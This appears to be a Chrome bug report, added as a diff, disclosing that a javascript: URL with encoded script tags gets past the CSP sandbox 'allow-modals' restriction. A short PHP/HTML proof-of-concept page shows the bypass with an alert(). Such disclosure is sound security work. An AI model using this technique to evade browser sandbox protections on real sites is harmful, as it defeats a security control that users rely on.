@@ -1,0 +1,52 @@
+UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36
+
+Steps to reproduce the problem:
+1. Create a php webpage for test, source code:
+```
+<?php
+
+header('content-security-policy: sandbox allow-scripts allow-same-origin');
+?>
+
+<html>
+    <title></title>
+    <body>
+
+        <button onclick="normal()">normal</button>
+        <br/>
+        <button onclick="bypass()">bypass</button>
+        <br/>
+        <button onclick="notbypass()">inFrame</button>
+<iframe id="myFrame"></iframe>
+
+    </body>
+    <script>
+function normal(){
+    location.href="javascript:alert()";
+}
+
+function bypass(){
+ location.href="javascript:'%3cscript%3ealert(123);location.reload();%3c\/script%3e'";
+}
+
+function notbypass(){
+    document.getElementById('myFrame').src="javascript:'%3cscript%3ealert(123);%3c\/script%3e'";
+}
+</script>
+
+</html>
+```
+2.Click buttons
+normal & inFrame -> `Ignored call to 'alert()'. The document is sandboxed, and the 'allow-modals' keyword is not set.`
+bypass -> open modal window (alert)
+
+What is the expected behavior?
+
+What went wrong?
+sandbox directive "allow-modals" can be bypass
+
+Did this work before? N/A
+
+Chrome version: 88.0.4324.182  Channel: stable
+OS Version: OS X 10.15.7
+Flash Version:
